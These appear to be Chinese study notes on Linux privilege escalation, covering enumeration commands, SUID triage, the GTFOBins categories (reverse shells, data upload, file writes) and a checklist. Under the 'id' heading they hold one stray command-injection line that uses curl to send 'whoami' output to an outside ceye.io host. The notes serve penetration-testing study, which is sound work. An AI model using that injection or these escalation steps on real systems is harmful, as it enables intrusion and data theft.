[TOC]



# Linux

- 特权升级的核心通常是从较低权限账户切换到更高权限账户。更技术性地说，它是利用操作系统或应用中的漏洞、设计缺陷或配置疏忽，非法访问通常对用户受限的资源。
- eg:-rwxr-xr-- 1 user group 123 5月21 10:00 test.sh

最开头的10个字符就是权限位

第1位：文件类型（-：普通文件；d：文件夹/目录；l：软连接【快捷方式】；b：块设备；c：字符设备）

第2~4位：所有者（u）权限

第5~7位：所属组（g）权限

第8~10位：其他人（o）权限

- r=读权限（4）
- w=写权限（2）
- x=执行权限（1）
- -=无对应权限

## 常见命令

### hostname

```
hostname
```

命令会返回目标机器的主机名。虽然该值可以轻易更改或字符串相对无意义（例如 Ubuntu-3487340239），但在某些情况下，它可以提供目标系统在企业网络中的角色信息（生产 SQL 服务器的 e.g. SQL-PROD-01）。

### uname -a

```
uname -a
```

打印系统信息，提供关于系统所用内核的额外细节。这在寻找可能导致权限升级的潜在内核漏洞时非常有用。

### /proc/version

- proc文件系统（procfs）提供关于目标系统进程的信息。你可以在许多不同的Linux版本中找到proc，使其成为你武器库中不可或缺的工具。

- 查看 /proc/version 可能会获得内核版本和额外信息，比如是否安装了编译器（例如 GCC）。

### /etc/issue

系统也可以通过查看 /etc/issue 文件来识别。该文件通常包含操作系统的一些信息，但可以轻松定制或更改。顺便说一句，任何包含系统信息的文件都可以自定义或更改。为了更清楚地理解系统，最好全部查看这些。

### ps Command

```
ps
```

ps命令是查看Linux系统上正在运行进程的有效方式。在终端上输入 ps，可以显示当前 shell 的进程。

ps的输出将显示以下内容

- PID：进程ID（进程唯一）
- TTY：用户使用的终端类型
- Time：进程所占用的CPU时间（这不是该进程运行的时间）
- CMD：命令或可执行文件正在运行（不会显示任何命令行参数）

```
ps -A
```

查看所有正在运行的进程

```
ps axjf
```

查看过程树（请参见下方运行ps axjf前的树状结构）

![image-20260428145405483](提权(专题).assets/image-20260428145405483-1777359250379-1.png)

```
ps aux
```

 aux 选项将显示所有用户的进程（a），显示启动进程的用户（u），并显示未连接到终端的进程（x）。通过查看ps辅助指令的输出，我们可以更好地理解系统和潜在漏洞。

### env

- env命令会显示环境变量。

- PATH变量可能包含编译器或脚本语言（例如Python），可用于在目标系统上运行代码或用于权限升级。

### sudo -l

- 目标系统可以配置为允许用户以root权限运行部分（或全部）命令。sudo -l 命令可以用来列出用户可以用 sudo 执行的所有命令。

### ls

- 在寻找潜在权限提升向量时，请记得始终使用带有-la参数的ls命令。下面的示例展示了如何使用ls或ls -l命令很容易漏掉“secret.txt”文件。

```
ls -la
```

### id

- id 命令将提供用户权限级别和组成员身份的总体概览。
- 值得记住的是，id 命令也可以用来为其他用户获取相同信息，如下所示。

xxxxxxxxxx 127.0.0.1&curl `whoami`.ff34r0.ceye.iotext

### /etc/passwd

虽然输出可能较长且略显威慑，但可以轻松切割并转换为用于暴力破解的实用列表。

![image-20260428145824768](提权(专题).assets/image-20260428145824768-1777359505937-5.png)

请记住，这将返回所有用户，其中一些是系统或服务用户，这些用户并不太有用。另一种方法是用grep表示“home”，因为真实用户的文件夹很可能都在“home”目录下。

![image-20260428145844276](提权(专题).assets/image-20260428145844276-1777359525247-7.png)

### history

用history命令查看早期命令可以让我们对目标系统有些了解，虽然很少能存储密码或用户名等信息。

### ifconfig

目标系统可能是通往另一个网络的枢轴点。ifconfig 命令会给我们系统网络接口的信息。下面的示例显示目标系统有三个接口（eth0、tun0 和 tun1）。我们的攻击机器能够访问eth0接口，但无法直接访问另外两个网络。

![image-20260428145951938](提权(专题).assets/image-20260428145951938-1777359592741-9.png)

可以通过 ip route 命令确认存在哪些网络路由。

### netstat

```
netstat -a
```

- 显示所有监听端口和已建立的连接。

```
netstat -at
```

or

```
netstat -au
```

- 可用于分别列出 TCP 或 UDP 协议。

```
netstat -l
```

- 将端口列为“监听”模式。这些端口已开放，准备接收来电连接。这可以通过“t”选项只列出使用以下tcp协议(netstat -lt)

```
netstat -s
```

-  列出按协议排列的网络使用统计数据（如下图）这也可以配合 -t 或 -u 选项使用，以限制输出到特定协议。

![image-20260428150325790](提权(专题).assets/image-20260428150325790-1777359806781-11.png)

```
netstat -tp
```

- 列出带有服务名称和PID信息的连接

这也可以配合 -l 选项来列出监听端口（见下文）

![image-20260428150410083](提权(专题).assets/image-20260428150410083-1777359850944-13.png)

我们可以看到"PID/Program name"列为空，因为该进程由另一用户拥有。

下面是同样的命令，运行root权限，显示为2641/nc（netcat）信息

![image-20260428150531316](提权(专题).assets/image-20260428150531316-1777359932268-15.png)

```
netstat -i
```

 显示接口统计数据。我们看到下面“eth0”和“tun0”比“tun1”更活跃。

![image-20260428150554839](提权(专题).assets/image-20260428150554839-1777359955639-17.png)

你在博客文章、文章和课程中最常看到的netstat用法是netstat -ano，可以分解如下

- `-a`: Display all sockets ： 显示所有插槽
- `-n`: Do not resolve names ：不要解析名字
- `-o`: Display timers ：显示计时器

### find

![image-20260428150800613](提权(专题).assets/image-20260428150800613-1777360081863-23.png)

- 该命令也可以配合（+）和（-）符号使用，指定文件大小大于给定大小。

![image-20260428150833628](提权(专题).assets/image-20260428150833628-1777360114741-25.png)

上述示例返回的文件大于100 MB。需要注意的是，“查找”命令往往会产生错误，有时会使输出难以读取。这就是为什么使用带有“-type f 2>/dev/null”的“find”命令将错误重定向到“/dev/null”，并获得更清晰的输出（见下文）。

![image-20260428150859017](提权(专题).assets/image-20260428150859017-1777360139898-27.png)

可写入或执行的文件夹和文件：

- `find / -writable -type d 2>/dev/null` : Find world-writeable folders ： 查找可写入的世界文件夹
- `find / -perm -222 -type d 2>/dev/null`: Find world-writeable folders ： 查找可写入的世界文件夹
- `find / -perm -o w -type d 2>/dev/null`: Find world-writeable folders ： 查找可写入的世界文件夹

我们看到三种不同的“查找”命令可能导致相同结果的原因，可以在手册中看到。如下所示，perm参数会影响“查找”的运作方式。

![image-20260428151029537](提权(专题).assets/image-20260428151029537-1777360230462-29.png)

```
find / -perm -o x -type d 2>/dev/null
```

- 查找世界可执行文件夹

查找开发工具和支持的语言：

- `find / -name perl*`

- `find / -name python*`

- `find / -name gcc*`

- **`-name` (Name):** **区分大小写**。查找时完全匹配指定的文件名。

- **`-iname` (Ignore-case Name):** **不区分大小写**。忽略文件名的大小写差异进行匹配

  ------

  

## 关于SUID

SUID提权信息收集：默认无需深挖的系统自带SUID文件

一、Linux默认自带、系统刚需SUID（基本不能利用提权，跳过排查）

1. 权限类/密码相关

-  /usr/bin/passwd ：改用户密码固定SUID，内核/系统加固后无法溢出提权
-  /usr/bin/chsh、/usr/bin/chfn ：修改shell、用户信息，现代Linux限制严格，极少漏洞

2. 挂载磁盘类

-  /bin/mount、/bin/umount ：系统标准挂载工具，普通用户无指定挂载路径权限，默认无法越权

特例：老旧系统放开挂载参数才有可能，主流发行版不用看

3. 权限变更类

-  /usr/bin/newgrp ：切换用户附属组，仅操作已有附属组，不能提root

4. 网络/登录工具

-  /usr/bin/su ：切换用户，需要密码，无密码无法root
-  /usr/lib/openssh/ssh-keysign ：ssh密钥签名组件，不能执行系统命令提权

5. ping网络工具

-  /bin/ping ：需要raw套接字所以带SUID，仅发包，无读写/执行权限，无法提权

二、排查思路：重点查非系统自带SUID

需要重点深挖的SUID（高危）

1. 自定义编译程序、管理员上传脚本： /home/*/xxx、/tmp/xxx、/opt/xxx 
2. 编辑器/运维工具： vim、nano、python、perl、bash、find、cp 被误设SUID
3. 第三方软件二进制：数据库、各类业务程序

三、查找SUID命令

bash

find / -perm -4000 2>/dev/null


筛选规则：不在/usr/bin /bin /sbin标准目录的SUID优先排查，系统原生程序直接跳过。

![image-20260627174517000](提权(专题).assets/image-20260627174517000.png)

## 关于GTFObins

| 功能标签 (Function)      | 核心作用                 | 潜在危害与利用场景                                           | 示例程序（部分）                              |
| :----------------------- | :----------------------- | :----------------------------------------------------------- | :-------------------------------------------- |
| **Shell**                | **获取交互式Shell**      | 直接从受限环境跳出，获得一个可执行任意命令的完整命令行界面，是最高危的类别之一。 | `awk`, `find`, `vim`, `nmap`                  |
| **Command**              | **执行非交互式系统命令** | 在无法获得完整Shell时，可用于执行单条系统命令，常用于信息收集或修改配置。 | `curl`, `wget`, `git`                         |
| **Reverse shell**        | **反弹Shell**            | 让目标系统主动连接攻击者监听的端口，通常用于绕过防火墙等入站流量限制。 | `bash`, `nc`, `python`, `php`                 |
| **Bind shell**           | **绑定Shell**            | 在目标系统上开放一个监听端口，等待攻击者连接，适用于目标可被直连的场景。 | `nc`, `socat`                                 |
| **File write**           | **写入本地文件**         | 可以创建或修改系统文件，最危险的是向`/etc/passwd`添加用户，或修改`~/.ssh/authorized_keys`写入自己的公钥。 | `cp`, `dd`, `tar`, `tee`                      |
| **File read**            | **读取本地文件**         | 可以读取任意敏感文件，如`/etc/shadow`（密码哈希）、`/root/flag.txt`或应用配置文件。 | `cat`, `head`, `tail`, `less`                 |
| **Upload**               | **上传本地数据**         | 将本地文件上传到远程服务器，可用于数据外泄。                 | `curl`, `nc`, `openssl`                       |
| **Download**             | **下载远程数据**         | 从远程服务器下载文件到本地，可用于在目标机器上部署后续攻击工具。 | `wget`, `curl`, `ftp`                         |
| **Library load**         | **加载共享库**           | 能够加载自定义的共享库（`.so`文件），从而在目标程序的执行上下文中运行任意代码。 | `bash` (with `enable -f`), `pldd`             |
| **Privilege escalation** | **权限提升**             | 可以提升当前用户的权限，例如利用SUID程序创建高权限的Shell。  | 多种通过SUID或Sudo提权的程序                  |
| **Inherit**              | **继承功能**             | 能**从另一个程序“继承”其功能**，常用于**绕过`sudo`的权限限制**。例如，利用`sudo`允许的程序执行另一个程序。 | `man`, `git`, `less` 等可通过`sudo`调用的程序 |

如何使用这些标签：

在 GTFOBins 网站（[gtfobins.org](https://gtfobins.org/)）上，你可以直接点击这些标签按钮来筛选程序：

- **点击标签筛选**：点击 `Shell` 标签，页面会列出所有能用来获取交互式 Shell 的程序。
- **多条件组合筛选**：你可以同时点击多个标签，例如 `Shell` + `SUID`，来查找那些同时具备这两种能力的程序。

了解这些功能标签，是高效使用 GTFOBins 的关键。在渗透测试中，你可以根据当前拥有的权限（如普通用户、`sudo` 权限等）和需要达成的目标（如读文件、提权），快速筛选出可利用的系统程序，从而实现“白象”攻击（Living Off the Land）。

## 信息收集

通常进入一个shell中想要提权要收集一下能提权的点，除了常规的查看我们有权限的文件外可以通过以下几个命令来更为广泛的收集信息

1.

```
/usr/sbin/getcap -r / 2>/dev/null
```

2.寻找有suid权限的命令，一般和文件有关的命令我们要重点注意，随后可以在GTFOBins中查找相应的提权方法

```
find / -perm -u=s -type f 2>/dev/null
```

3.寻找写入权限的文件，一把这种文件既然能写肯定也是可读的，这种文件一般有敏感信息

```
find / -writable -type f 2>/dev/null | grep -v sys | grep -v proc
```

4.查看计划文件。一般里面都有以root权限每隔一段时间执行一次的计划

```
cat /etc/crontab
```

5.目标系统可以配置为允许用户以root权限运行部分（或全部）命令。sudo -l 命令可以用来列出用户可以用 sudo 执行的所有命令。

```
sudo -l
```

6.内核漏洞利用

```
uname -a
cat /etc/issue
cat /proc/version
```

